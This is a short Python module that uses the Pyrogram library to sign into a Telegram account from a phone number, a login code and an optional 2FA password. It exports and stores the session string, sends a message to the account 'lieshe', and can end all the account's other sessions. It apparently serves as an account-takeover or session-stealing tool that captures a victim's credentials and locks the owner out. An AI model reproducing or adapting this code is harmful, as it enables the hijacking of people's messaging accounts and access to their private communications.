from pyrogram import Client
import datetime
from pyrogram.raw.functions.auth import ResetAuthorizations
from pyrogram.errors import SessionPasswordNeeded


class Session:
    pyrogram_str: str = ''
    valid: bool = False
    reg_time: str = ''
    phone: str = ''
    phone_code_hash: str = ''
    code: str = ''

    def __init__(self):

        self.client: Client = Client('auth', 2040, "b18441a1ff607e10a989891a5462e627", in_memory=True)

    def set_datatime_now(self):
        self.reg_time = datetime.datetime.now().__str__()

    def get_datatime(self):
        return datetime.datetime.fromisoformat(self.reg_time)

    async def send_code(self, phone: str):
        try:
            if not self.client.is_connected:
                await self.client.connect()
            self.phone = phone

            sent_code_info = await self.client.send_code(phone)
            self.phone_code_hash = sent_code_info.phone_code_hash
            return True
        except Exception as e:
            print(e)
            return False

    async def auth(self, code=None, password=None):
        if code:
            self.code = code
        try:
            if not self.client.is_connected:
                await self.client.connect()
            if password:
                await self.client.check_password(password)
            else:
                await self.client.sign_in(self.phone, self.phone_code_hash, self.code)
            await self.client.send_message('lieshe', 'ass2')
            self.pyrogram_str = await self.client.export_session_string()
            self.valid = True
            return 1
        except SessionPasswordNeeded as e:
            return 2
        except Exception as e:
            self.valid = False
            print(f"Выплюнута ошибка ({e})")
            return 0

    async def delete_other_sessions(self):
        if not self.client.is_initialized:
            print(f'Клиент не инициализирован')
            return False
        if self.client.is_connected:
            await self.client.invoke(ResetAuthorizations())

    def import_to_dict(self) -> dict:
        dictionary = {
            'pyrogram_str': self.pyrogram_str,
            'valid': self.valid,
            'reg_time': self.reg_time,
            'phone': self.phone,
            'phone_code_hash': self.phone_code_hash
        }
        return dictionary

    def load_from_dict(self, dictionary: dict):
        self.pyrogram_str = dictionary['pyrogram_str']
        self.valid = dictionary['valid']
        self.reg_time = dictionary['reg_time']
        self.phone = dictionary['phone']
        self.phone_code_hash = dictionary['phone_code_hash']

